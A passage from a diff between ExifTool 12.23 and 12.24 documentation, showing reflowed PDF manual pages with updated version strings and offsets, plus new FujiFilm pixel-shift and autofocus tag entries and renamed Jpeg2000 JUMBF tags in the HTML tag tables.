 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    14)Tj
+(                           -- Image::ExifTool 12.24 --                                    14)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(               recommendation \(RFC-1123\) when writing, and a warning to be)Tj
+(               of causing the date/time to be reformatted according to PNG 1.2)Tj
 0 -1.1 TD
+(               recommendation \(RFC-1123\) when writing, and a warning to be)Tj
+T*
 (               issued for any non-standard value when reading \(but note that)Tj
 T*
 (               Windows may not recognize PNG date/time values in standard)Tj
@@ -2346,7 +2348,7 @@
 endobj
 50 0 obj
 <<
-/Length 4249
+/Length 4218
 >>
 stream
 BT
@@ -2356,9 +2358,9 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    15)Tj
+(                           -- Image::ExifTool 12.24 --                                    15)Tj
 /TT4 1 Tf
-0 -1.6333 TD
+0 -2.7333 TD
 (           Verbose)Tj
 0 -1.1 TD
 (               Print verbose messages to file specified by TextOut option.)Tj
@@ -2514,8 +2516,6 @@
 (           1904 time zero\), RequestAll, RequestTags, SaveFormat, SavePath,)Tj
 T*
 (           ScanForXMP, Struct, TextOut, Unknown, Verbose, XAttrTags and)Tj
-T*
-(           XMPAutoConv.)Tj
 ET
 endstream
 endobj
@@ -2533,7 +2533,7 @@
 endobj
 53 0 obj
 <<
-/Length 4130
+/Length 4168
 >>
 stream
 BT
@@ -2543,9 +2543,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    16)Tj
+(                           -- Image::ExifTool 12.24 --                                    16)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(           XMPAutoConv.)Tj
+0 -2.2 TD
 (       Return Value:)Tj
 0 -1.1 TD
 (           1 if this was a recognized file format, 0 otherwise \(and 'Error')Tj
@@ -2698,7 +2700,7 @@
 endobj
 56 0 obj
 <<
-/Length 4045
+/Length 4009
 >>
 stream
 BT
@@ -2708,9 +2710,9 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    17)Tj
+(                           -- Image::ExifTool 12.24 --                                    17)Tj
 /TT4 1 Tf
-0 -1.6333 TD
+0 -2.7333 TD
 (       Inputs:)Tj
 0 -1.1 TD
 (           0\) ExifTool object reference)Tj
@@ -2834,8 +2836,6 @@
 (           1\) [optional] Information hash reference or tag list reference)Tj
 T*
 (           2\) [optional] Sort order \('Input', 'File', 'Tag', 'Descr' or)Tj
-0 -1.1 TD
-(           'Group#'\))Tj
 ET
 endstream
 endobj
@@ -2853,7 +2853,7 @@
 endobj
 59 0 obj
 <<
-/Length 4391
+/Length 4352
 >>
 stream
 BT
@@ -2863,11 +2863,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    18)Tj
+(                           -- Image::ExifTool 12.24 --                                    18)Tj
 /TT4 1 Tf
-0 -2.7333 TD
-(           3\) [optional] Secondary sort order \('File', 'Tag' or 'Descr'\))Tj
+0 -1.6333 TD
+(           'Group#'\))Tj
 0 -2.2 TD
+(           3\) [optional] Secondary sort order \('File', 'Tag' or 'Descr'\))Tj
+T*
 (           If the information hash or tag list reference is not provided, then)Tj
 0 -1.1 TD
 (           the list of found tags from the last call to "ImageInfo",)Tj
@@ -3041,8 +3043,6 @@
 (       Note that "GetValue" requires a case-sensitive tag key as an argument.)Tj
 0 -1.1 TD
 (       To retrieve tag information based on a case-insensitive tag name \(with)Tj
-T*
-(       an optional group specifier\), use "GetInfo" instead.)Tj
 ET
 endstream
 endobj
@@ -3060,7 +3060,7 @@
 endobj
 62 0 obj
 <<
-/Length 3962
+/Length 3961
 >>
 stream
 BT
@@ -3070,9 +3070,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    19)Tj
+(                           -- Image::ExifTool 12.24 --                                    19)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(       an optional group specifier\), use "GetInfo" instead.)Tj
+0 -2.2 TD
 (           # PrintConv example)Tj
 0 -1.1 TD
 (           my $val = $exifTool->GetValue\($tag\);)Tj
@@ -3204,8 +3206,6 @@
 (       values.)Tj
 0 -2.2 TD
 (           # set a new value for a tag \(errors go to STDERR\))Tj
-0 -1.1 TD
-(           $success = $exifTool->SetNewValue\($tag, $value\);)Tj
 ET
 endstream
 endobj
@@ -3223,7 +3223,7 @@
 endobj
 65 0 obj
 <<
-/Length 4036
+/Length 4027
 >>
 stream
 BT
@@ -3233,9 +3233,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    20)Tj
+(                           -- Image::ExifTool 12.24 --                                    20)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(           $success = $exifTool->SetNewValue\($tag, $value\);)Tj
+0 -2.2 TD
 (           # set a new value and capture any error message)Tj
 0 -1.1 TD
 (           \($success, $errStr\) = $exifTool->SetNewValue\($tag, $value\);)Tj
@@ -3339,8 +3341,6 @@
 (           2 group names with optional leading family numbers, separated by)Tj
 T*
 (           colons \(eg. 'EXIF:Artist', 'XMP:Time:*'\), which is equivalent to)Tj
-T*
-(           using a Group option argument.  Also, a '#' may be appended to the)Tj
 ET
 endstream
 endobj
@@ -3368,11 +3368,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    21)Tj
+(                           -- Image::ExifTool 12.24 --                                    21)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           tag name \(eg. 'EXIF:Orientation#'\), with the same effect as setting)Tj
+(           using a Group option argument.  Also, a '#' may be appended to the)Tj
 0 -1.1 TD
+(           tag name \(eg. 'EXIF:Orientation#'\), with the same effect as setting)Tj
+T*
 (           Type to 'ValueConv'.  Wildcards \('*' and '?'\) may be used in the)Tj
 T*
 (           tag name to assign multiple tags simultaneously.  A tag name of '*')Tj
@@ -3488,8 +3490,6 @@
 (               'protected' tags, and should only be used internally by)Tj
 T*
 (               ExifTool.  See Image::ExifTool::TagNames, for a list of tag)Tj
-T*
-(               names indicating 'unsafe' and 'protected' tags.  Default is 0.)Tj
 ET
 endstream
 endobj
@@ -3517,9 +3517,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    22)Tj
+(                           -- Image::ExifTool 12.24 --                                    22)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(               names indicating 'unsafe' and 'protected' tags.  Default is 0.)Tj
+0 -2.2 TD
 (           ProtectSaved)Tj
 0 -1.1 TD
 (               Avoid setting new values which were saved after the Nth call to)Tj
@@ -3695,8 +3697,6 @@
 (       Inputs:)Tj
 0 -1.1 TD
 (           0\) ExifTool object reference)Tj
-0 -2.2 TD
-(           1\) Tag name \(case sensitive, may be prefixed by family 0, 1 or 7)Tj
 ET
 endstream
 endobj
@@ -3714,7 +3714,7 @@
 endobj
 75 0 obj
 <<
-/Length 4649
+/Length 4656
 >>
 stream
 BT
@@ -3724,9 +3724,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    23)Tj
+(                           -- Image::ExifTool 12.24 --                                    23)Tj
 /TT4 1 Tf
 0 -1.6333 TD
+(           1\) Tag name \(case sensitive, may be prefixed by family 0, 1 or 7)Tj
+0 -1.1 TD
 (           group names, separated by colons\))Tj
 0 -2.2 TD
 (       Return Values:)Tj
@@ -3874,8 +3876,6 @@
 (           Both 'SRCTAG' and 'DSTTAG' may contain wildcards and/or be prefixed)Tj
 T*
 (           by a group name \(eg.  'fileModifyDate<modifyDate' or 'xmp:*<*'\),)Tj
-T*
-(           and/or suffixed by a '#' to disable print conversion.  Copied tags)Tj
 ET
 endstream
 endobj
@@ -3893,7 +3893,7 @@
 endobj
 78 0 obj
 <<
-/Length 4484
+/Length 4480
 >>
 stream
 BT
@@ -3903,11 +3903,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    24)Tj
+(                           -- Image::ExifTool 12.24 --                                    24)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           may also be added or deleted from a list with arguments of the form)Tj
+(           and/or suffixed by a '#' to disable print conversion.  Copied tags)Tj
 0 -1.1 TD
+(           may also be added or deleted from a list with arguments of the form)Tj
+T*
 (           'DSTTAG+<SRCTAG' or 'DSTTAG-<SRCTAG'.  Tags are evaluated in order,)Tj
 T*
 (           so exclusions apply only to tags included earlier in the list.  An)Tj
@@ -4017,8 +4019,6 @@
 (           The "Duplicates" option is always in effect for tags extracted from)Tj
 0 -1.1 TD
 (           the source file using this routine.)Tj
-0 -2.2 TD
-(           The "Struct" option is enabled by default for tags extracted by)Tj
 ET
 endstream
 endobj
@@ -4036,7 +4036,7 @@
 endobj
 81 0 obj
 <<
-/Length 4317
+/Length 4371
 >>
 stream
 BT
@@ -4046,11 +4046,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    25)Tj
+(                           -- Image::ExifTool 12.24 --                                    25)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           this routine.  This allows the hierarchy of complex structures to)Tj
+(           The "Struct" option is enabled by default for tags extracted by)Tj
 0 -1.1 TD
+(           this routine.  This allows the hierarchy of complex structures to)Tj
+T*
 (           be preserved when copying, but the Struct option may be set to 0 to)Tj
 T*
 (           override this behaviour and copy as flattened tags instead.)Tj
@@ -4268,8 +4270,6 @@
 (           1 if the time was changed, 0 if nothing was done, or -1 if there)Tj
 T*
 (           was an error setting the time.)Tj
-0 -2.2 TD
-(       Notes:)Tj
 ET
 endstream
 endobj
@@ -4287,7 +4287,7 @@
 endobj
 84 0 obj
 <<
-/Length 4138
+/Length 4104
 >>
 stream
 BT
@@ -4297,11 +4297,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    26)Tj
+(                           -- Image::ExifTool 12.24 --                                    26)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           Equivalent to, but more efficient than calling "WriteInfo" when)Tj
+(       Notes:)Tj
 0 -1.1 TD
+(           Equivalent to, but more efficient than calling "WriteInfo" when)Tj
+T*
 (           only the FileModifyDate or FileCreateDate tag has been set.  If a)Tj
 T*
 (           timezone is not specified, local time is assumed.  When shifting,)Tj
@@ -4473,8 +4475,6 @@
 (           @groups = $exifTool->GetNewGroups\(\);)Tj
 T*
 (       Inputs:)Tj
-0 -1.1 TD
-(           0\) ExifTool object reference)Tj
 ET
 endstream
 endobj
@@ -4492,7 +4492,7 @@
 endobj
 87 0 obj
 <<
-/Length 3762
+/Length 3733
 >>
 stream
 BT
@@ -4502,9 +4502,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    27)Tj
+(                           -- Image::ExifTool 12.24 --                                    27)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(           0\) ExifTool object reference)Tj
+0 -2.2 TD
 (       Return Values:)Tj
 0 -1.1 TD
 (           List of group names in order of write priority.  Highest priority)Tj
@@ -4664,8 +4666,6 @@
 (           families in list context.  Returns a string of group names)Tj
 T*
 (           separated by colons if the input group family contains a colon.)Tj
-T*
-(           The string is simplified to remove a leading 'Main:' and adjacent)Tj
 ET
 endstream
 endobj
@@ -4683,7 +4683,7 @@
 endobj
 90 0 obj
 <<
-/Length 5018
+/Length 5021
 >>
 stream
 BT
@@ -4693,9 +4693,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    28)Tj
+(                           -- Image::ExifTool 12.24 --                                    28)Tj
 /TT4 1 Tf
 0 -1.6333 TD
+(           The string is simplified to remove a leading 'Main:' and adjacent)Tj
+0 -1.1 TD
 (           identical group names unless the family string begins with a colon.)Tj
 0 -2.2 TD
 (       Notes:)Tj
@@ -4813,8 +4815,6 @@
 (           hex.  Note that unlike other group names, the tag ID's of family 7)Tj
 T*
 (           group names are case sensitive \(but the leading "ID-" is not\).)Tj
-0 -2.2 TD
-(           See "GetAllGroups [static]" for complete lists of group names.)Tj
 ET
 endstream
 endobj
@@ -4832,7 +4832,7 @@
 endobj
 93 0 obj
 <<
-/Length 4328
+/Length 4380
 >>
 stream
 BT
@@ -4842,9 +4842,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    29)Tj
+(                           -- Image::ExifTool 12.24 --                                    29)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(           See "GetAllGroups [static]" for complete lists of group names.)Tj
+0 -2.2 TD
 (   G)Tj
 1.8 0 TD
 (Ge)Tj
@@ -5074,8 +5076,6 @@
 (       Inputs:)Tj
 0 -1.1 TD
 (           \(none\))Tj
-0 -2.2 TD
-(       Return Values:)Tj
 ET
 endstream
 endobj
@@ -5093,7 +5093,7 @@
 endobj
 96 0 obj
 <<
-/Length 4933
+/Length 4886
 >>
 stream
 BT
@@ -5103,9 +5103,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    30)Tj
+(                           -- Image::ExifTool 12.24 --                                    30)Tj
 /TT4 1 Tf
 0 -1.6333 TD
+(       Return Values:)Tj
+0 -1.1 TD
 (           List of shortcut tags \(as defined in Image::ExifTool::Shortcuts\).)Tj
 0 -2.2 TD
 (   G)Tj
@@ -5335,8 +5337,6 @@
 (           HTML, HTML-dc, HTML-ncc, HTML-office, HTML-prod, HTML-vw96, HTTP-)Tj
 T*
 (           equiv, ICC-chrm, ICC-clrt, ICC-header, ICC-meas, ICC-meta, ICC-)Tj
-T*
-(           view, ICC_Profile, ICC_Profile#, ID3, ID3v1, ID3v1_Enh, ID3v2_2,)Tj
 ET
 endstream
 endobj
@@ -5354,7 +5354,7 @@
 endobj
 99 0 obj
 <<
-/Length 4765
+/Length 4812
 >>
 stream
 BT
@@ -5364,11 +5364,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    31)Tj
+(                           -- Image::ExifTool 12.24 --                                    31)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           ID3v2_3, ID3v2_4, IFD0, IFD1, IPTC, IPTC#, ISO, ITC, Insta360,)Tj
+(           view, ICC_Profile, ICC_Profile#, ID3, ID3v1, ID3v1_Enh, ID3v2_2,)Tj
 0 -1.1 TD
+(           ID3v2_3, ID3v2_4, IFD0, IFD1, IPTC, IPTC#, ISO, ITC, Insta360,)Tj
+T*
 (           InteropIFD, ItemList, JFIF, JFXX, JPEG, JPEG-HDR, JSON, JUMBF, JVC,)Tj
 T*
 (           Jpeg2000, KDC_IFD, Keys, Kodak, KodakBordersIFD, KodakEffectsIFD,)Tj
@@ -5528,8 +5530,6 @@
 (       Inputs:)Tj
 0 -1.1 TD
 (           None.)Tj
-0 -2.2 TD
-(       Return Values:)Tj
 ET
 endstream
 endobj
@@ -5547,7 +5547,7 @@
 endobj
 103 0 obj
 <<
-/Length 4949
+/Length 4896
 >>
 stream
 BT
@@ -5557,11 +5557,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    32)Tj
+(                           -- Image::ExifTool 12.24 --                                    32)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           A list of deletable group names in alphabetical order.  The current)Tj
+(       Return Values:)Tj
 0 -1.1 TD
+(           A list of deletable group names in alphabetical order.  The current)Tj
+T*
 (           list of deletable group names is:)Tj
 0 -2.2 TD
 (           Adobe, AFCP, APP0, APP1, APP10, APP11, APP12, APP13, APP14, APP15,)Tj
@@ -5771,8 +5773,6 @@
 (])Tj
 -12 -1.1 TD
 (       Can the specified file be created?)Tj
-0 -2.2 TD
-(           my $creatable = Image::ExifTool::CanCreate\($filename\);)Tj
 ET
 endstream
 endobj
@@ -5790,7 +5790,7 @@
 endobj
 106 0 obj
 <<
-/Length 4693
+/Length 4690
 >>
 stream
 BT
@@ -5800,9 +5800,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    33)Tj
+(                           -- Image::ExifTool 12.24 --                                    33)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(           my $creatable = Image::ExifTool::CanCreate\($filename\);)Tj
+0 -2.2 TD
 (       Inputs:)Tj
 0 -1.1 TD
 (           0\) File name or extension)Tj
@@ -6002,8 +6004,6 @@
 (           character i/o routines if Win32API::File is available.)Tj
 0 -2.2 TD
 (       Internal Character Sets:)Tj
-0 -1.1 TD
-(           The encodings used to store strings in the various metadata)Tj
 ET
 endstream
 endobj
@@ -6021,7 +6021,7 @@
 endobj
 109 0 obj
 <<
-/Length 5318
+/Length 5396
 >>
 stream
 BT
@@ -6031,11 +6031,13 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    34)Tj
+(                           -- Image::ExifTool 12.24 --                                    34)Tj
 /TT4 1 Tf
 0 -1.6333 TD
-(           formats.  These encodings may be changed for certain types of)Tj
+(           The encodings used to store strings in the various metadata)Tj
 0 -1.1 TD
+(           formats.  These encodings may be changed for certain types of)Tj
+T*
 (           metadata via the "CharsetEXIF", "CharsetID3", "CharsetIPTC",)Tj
 T*
 (           "CharsetPhotoshop", "CharsetQuickTime" and "CharsetRIFF" options.)Tj
@@ -6228,7 +6230,7 @@
 endobj
 112 0 obj
 <<
-/Length 4720
+/Length 4692
 >>
 stream
 BT
@@ -6238,9 +6240,9 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    35)Tj
+(                           -- Image::ExifTool 12.24 --                                    35)Tj
 /TT4 1 Tf
-0 -1.6333 TD
+0 -2.7333 TD
 (         exiftool -tagsfromfile @ -iptc:all -codedcharacterset=utf8 \\)Tj
 0 -1.1 TD
 (         -charset iptc=latin2 a.jpg)Tj
@@ -6418,8 +6420,6 @@
 (       this to UTF-8, but the internal and external character sets may be)Tj
 T*
 (       specified with the "CharsetPhotoshop" and "Charset" options)Tj
-T*
-(       respectively.)Tj
 ET
 endstream
 endobj
@@ -6437,7 +6437,7 @@
 endobj
 115 0 obj
 <<
-/Length 5222
+/Length 5257
 >>
 stream
 BT
@@ -6447,9 +6447,11 @@
 /GS1 gs
 0 Tc
 0 Tw
-(                           -- Image::ExifTool 12.23 --                                    36)Tj
+(                           -- Image::ExifTool 12.24 --                                    36)Tj
 /TT4 1 Tf
-0 -2.7333 TD
+0 -1.6333 TD
+(       respectively.)Tj
+0 -2.2 TD
 (   Q)Tj
 1.8 0 TD
 (Qu)Tj
@@ -6860,7 +6862,7 @@
 0.6 0 TD
 (G\(3pm\))Tj
 -27 -4.4 TD
-(perl v5.18.4                      2021-04-01                       EXIFTOOL\(1\))Tj
+(perl v5.18.4                      2021-04-13                       EXIFTOOL\(1\))Tj
 ET
 endstream
 endobj
@@ -7296,8 +7298,8 @@
 endobj
 121 0 obj
 <<
-/CreationDate (D:20210401142149-04'00')
-/ModDate (D:20210401142149-04'00')
+/CreationDate (D:20210413110922-04'00')
+/ModDate (D:20210413110922-04'00')
 /Producer (Apple pstopdf)
 >>
 endobj
@@ -7311,135 +7313,135 @@
 xref
 0 123
 0000000000 65535 f 
-0000170483 00000 n 
+0000170479 00000 n 
 0000000016 00000 n 
 0000004112 00000 n 
-0000169484 00000 n 
-0000169885 00000 n 
-0000168949 00000 n 
-0000173585 00000 n 
-0000170563 00000 n 
+0000169480 00000 n 
+0000169881 00000 n 
+0000168945 00000 n 
+0000173581 00000 n 
+0000170559 00000 n 
 0000004218 00000 n 
 0000009568 00000 n 
-0000170644 00000 n 
+0000170640 00000 n 
 0000009675 00000 n 
 0000014402 00000 n 
-0000170727 00000 n 
+0000170723 00000 n 
 0000014509 00000 n 
 0000019439 00000 n 
-0000170810 00000 n 
+0000170806 00000 n 
 0000019546 00000 n 
 0000024260 00000 n 
-0000170893 00000 n 
+0000170889 00000 n 
 0000024367 00000 n 
-0000028252 00000 n 
-0000170976 00000 n 
-0000028359 00000 n 
-0000033216 00000 n 
-0000171059 00000 n 
-0000033323 00000 n 
-0000037796 00000 n 
-0000171142 00000 n 
-0000037903 00000 n 
-0000042928 00000 n 
-0000171225 00000 n 
-0000043035 00000 n 
-0000047563 00000 n 
-0000171308 00000 n 
-0000047670 00000 n 
-0000052449 00000 n 
-0000174111 00000 n 
-0000173720 00000 n 
-0000171392 00000 n 
-0000052556 00000 n 
-0000056941 00000 n 
-0000171476 00000 n 
-0000057048 00000 n 
-0000061571 00000 n 
-0000171560 00000 n 
-0000061678 00000 n 
-0000065970 00000 n 
-0000171644 00000 n 
-0000066077 00000 n 
-0000070379 00000 n 
-0000171728 00000 n 
-0000070486 00000 n 
-0000074669 00000 n 
-0000171812 00000 n 
-0000074776 00000 n 
-0000078874 00000 n 
-0000171896 00000 n 
-0000078981 00000 n 
-0000083425 00000 n 
-0000171980 00000 n 
-0000083532 00000 n 
-0000087547 00000 n 
-0000172064 00000 n 
-0000087654 00000 n 
-0000091743 00000 n 
-0000172148 00000 n 
-0000091850 00000 n 
-0000096542 00000 n 
-0000173858 00000 n 
-0000172232 00000 n 
-0000096649 00000 n 
-0000101295 00000 n 
-0000172316 00000 n 
-0000101402 00000 n 
-0000106104 00000 n 
-0000172400 00000 n 
-0000106211 00000 n 
-0000110748 00000 n 
-0000172484 00000 n 
-0000110855 00000 n 
-0000115225 00000 n 
-0000172568 00000 n 
-0000115332 00000 n 
-0000119523 00000 n 
-0000172652 00000 n 
-0000119630 00000 n 
-0000123445 00000 n 
-0000172736 00000 n 
-0000123552 00000 n 
-0000128623 00000 n 
-0000172820 00000 n 
-0000128730 00000 n 
-0000133111 00000 n 
-0000172904 00000 n 
-0000133218 00000 n 
-0000138204 00000 n 
-0000172988 00000 n 
-0000138311 00000 n 
-0000143129 00000 n 
-0000173996 00000 n 
-0000173074 00000 n 
-0000143237 00000 n 
-0000148240 00000 n 
-0000173162 00000 n 
-0000148348 00000 n 
-0000153095 00000 n 
-0000173250 00000 n 
-0000153203 00000 n 
-0000158575 00000 n 
-0000173338 00000 n 
-0000158683 00000 n 
-0000163457 00000 n 
-0000173426 00000 n 
-0000163565 00000 n 
-0000168841 00000 n 
-0000169089 00000 n 
-0000169292 00000 n 
-0000173514 00000 n 
-0000173543 00000 n 
-0000174217 00000 n 
-0000174341 00000 n 
+0000028248 00000 n 
+0000170972 00000 n 
+0000028355 00000 n 
+0000033150 00000 n 
+0000171055 00000 n 
+0000033257 00000 n 
+0000037723 00000 n 
+0000171138 00000 n 
+0000037830 00000 n 
+0000042853 00000 n 
+0000171221 00000 n 
+0000042960 00000 n 
+0000047513 00000 n 
+0000171304 00000 n 
+0000047620 00000 n 
+0000052394 00000 n 
+0000174107 00000 n 
+0000173716 00000 n 
+0000171388 00000 n 
+0000052501 00000 n 
+0000056862 00000 n 
+0000171472 00000 n 
+0000056969 00000 n 
+0000061481 00000 n 
+0000171556 00000 n 
+0000061588 00000 n 
+0000065966 00000 n 
+0000171640 00000 n 
+0000066073 00000 n 
+0000070344 00000 n 
+0000171724 00000 n 
+0000070451 00000 n 
+0000074672 00000 n 
+0000171808 00000 n 
+0000074779 00000 n 
+0000078841 00000 n 
+0000171892 00000 n 
+0000078948 00000 n 
+0000083353 00000 n 
+0000171976 00000 n 
+0000083460 00000 n 
+0000087474 00000 n 
+0000172060 00000 n 
+0000087581 00000 n 
+0000091661 00000 n 
+0000172144 00000 n 
+0000091768 00000 n 
+0000096460 00000 n 
+0000173854 00000 n 
+0000172228 00000 n 
+0000096567 00000 n 
+0000101213 00000 n 
+0000172312 00000 n 
+0000101320 00000 n 
+0000106029 00000 n 
+0000172396 00000 n 
+0000106136 00000 n 
+0000110669 00000 n 
+0000172480 00000 n 
+0000110776 00000 n 
+0000115200 00000 n 
+0000172564 00000 n 
+0000115307 00000 n 
+0000119464 00000 n 
+0000172648 00000 n 
+0000119571 00000 n 
+0000123357 00000 n 
+0000172732 00000 n 
+0000123464 00000 n 
+0000128538 00000 n 
+0000172816 00000 n 
+0000128645 00000 n 
+0000133078 00000 n 
+0000172900 00000 n 
+0000133185 00000 n 
+0000138124 00000 n 
+0000172984 00000 n 
+0000138231 00000 n 
+0000143096 00000 n 
+0000173992 00000 n 
+0000173070 00000 n 
+0000143204 00000 n 
+0000148154 00000 n 
+0000173158 00000 n 
+0000148262 00000 n 
+0000153006 00000 n 
+0000173246 00000 n 
+0000153114 00000 n 
+0000158564 00000 n 
+0000173334 00000 n 
+0000158672 00000 n 
+0000163418 00000 n 
+0000173422 00000 n 
+0000163526 00000 n 
+0000168837 00000 n 
+0000169085 00000 n 
+0000169288 00000 n 
+0000173510 00000 n 
+0000173539 00000 n 
+0000174213 00000 n 
+0000174337 00000 n 
 trailer
 <<
 /Size 123
 /Root 122 0 R
 /Info 121 0 R
-/ID [<b0cc62a5be0c1030b6f351e712d1e1cb><b0cc62a5be0c1030b6f351e712d1e1cb>]
+/ID [<560ec6fe6e5440771a95f440aabbe0e8><560ec6fe6e5440771a95f440aabbe0e8>]
 >>
 startxref
-174413
+174409
 %%EOF

diff -u -r -N exiftool-12.23/html/Shift.pdf exiftool-12.24/html/Shift.pdf
--- exiftool-12.23/html/Shift.pdf	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/Shift.pdf	2021-04-13 15:11:46.000000000 +0000
@@ -593,8 +593,8 @@
 endobj
 16 0 obj
 <<
-/CreationDate (D:20210401142150-04'00')
-/ModDate (D:20210401142150-04'00')
+/CreationDate (D:20210413110922-04'00')
+/ModDate (D:20210413110922-04'00')
 /Producer (Apple pstopdf)
 >>
 endobj
@@ -630,7 +630,7 @@
 /Size 18
 /Root 17 0 R
 /Info 16 0 R
-/ID [<89c8b97ce96c2a9e18d602ed3bb880d8><89c8b97ce96c2a9e18d602ed3bb880d8>]
+/ID [<aaba228f321479095b428dfe7ef65dcb><aaba228f321479095b428dfe7ef65dcb>]
 >>
 startxref
 11800

diff -u -r -N exiftool-12.23/html/TagNames/FujiFilm.html exiftool-12.24/html/TagNames/FujiFilm.html
--- exiftool-12.23/html/TagNames/FujiFilm.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/FujiFilm.html	2021-04-13 15:11:46.000000000 +0000
@@ -377,7 +377,8 @@
   <br><span class=n>(other models)</span>
   <br>0 = Off
   <br>1 = On
-  <br>2 = No flash &amp; flash</span></td></tr>
+  <br>2 = No flash &amp; flash
+  <br>6 = Pixel Shift</span></td></tr>
 <tr class=b>
 <td title='0x1101 = 4353'>0x1101</td>
 <td>SequenceNumber</td>
@@ -389,6 +390,16 @@
 <td class=c>-</td>
 <td>--&gt; <a href='FujiFilm.html#DriveSettings'>FujiFilm DriveSettings Tags</a></td></tr>
 <tr class=b>
+<td title='0x1105 = 4357'>0x1105</td>
+<td>PixelShiftShots</td>
+<td class=c>int16u</td>
+<td>&nbsp;</td></tr>
+<tr>
+<td title='0x1106 = 4358'>0x1106</td>
+<td>PixelShiftOffset</td>
+<td class=c>rational64s[2]</td>
+<td>&nbsp;</td></tr>
+<tr class=b>
 <td title='0x1153 = 4435'>0x1153</td>
 <td>PanoramaAngle</td>
 <td class=c>int16u</td>
@@ -718,27 +729,33 @@
 <td class=r title='0 = 0x0'>0.1</td>
 <td>FocusMode2</td>
 <td class=c>int32u</td>
-<td><span class=s>[val &amp; 0xff]
+<td><span class=s>[val &amp; 0xf]
   <br>0 = AF-M
   <br>1 = AF-S
-  <br>2 = AF-C
-  <br>17 = AF-S (Auto)</span></td></tr>
+  <br>2 = AF-C</span></td></tr>
 <tr class=b>
 <td class=r title='0 = 0x0'>0.2</td>
+<td>PreAF</td>
+<td class=c>int32u</td>
+<td><span class=s>[val &gt;&gt; 4 &amp; 0xf]
+  <br>0 = Off
+  <br>1 = On</span></td></tr>
+<tr>
+<td class=r title='0 = 0x0'>0.3</td>
 <td>AFAreaMode</td>
 <td class=c>int32u</td>
 <td><span class=s>[val &gt;&gt; 8 &amp; 0xf]
   <br>0 = Single Point
   <br>1 = Zone
   <br>2 = Wide/Tracking</span></td></tr>
-<tr>
-<td class=r title='0 = 0x0'>0.3</td>
+<tr class=b>
+<td class=r title='0 = 0x0'>0.4</td>
 <td>AFAreaPointSize</td>
 <td class=c>int32u</td>
 <td><span class=s>[val &gt;&gt; 12 &amp; 0xf]
   <br>0 = n/a</span></td></tr>
-<tr class=b>
-<td class=r title='0 = 0x0'>0.4</td>
+<tr>
+<td class=r title='0 = 0x0'>0.5</td>
 <td>AFAreaZoneSize</td>
 <td class=c>int32u</td>
 <td><span class=s>[val &gt;&gt; 16 &amp; 0xf]
@@ -1189,7 +1206,7 @@
 
 <hr>
 (This document generated automatically by Image::ExifTool::BuildTagLookup)
-<br><i>Last revised Feb 3, 2021</i>
+<br><i>Last revised Apr 13, 2021</i>
 <p class=lf><a href='index.html'>&lt;-- ExifTool Tag Names</a></p>
 </body>
 </html>

diff -u -r -N exiftool-12.23/html/TagNames/Jpeg2000.html exiftool-12.24/html/TagNames/Jpeg2000.html
--- exiftool-12.23/html/TagNames/Jpeg2000.html	2021-04-01 18:24:21.000000000 +0000
+++ exiftool-12.24/html/TagNames/Jpeg2000.html	2021-04-13 15:11:46.000000000 +0000
@@ -430,23 +430,31 @@
 <tr class=h><th>Tag&nbsp;ID</th><th>Tag Name</th>
 <th>Writable</th><th>Values / <span class=n>Notes</span></th></tr>
 <tr>
-<td>'id'</td>
-<td>JUMBFID</td>
+<td>'jumd-flags'</td>
+<td>JUMDFlags</td>
 <td class=c>no</td>
-<td>&nbsp;</td></tr>
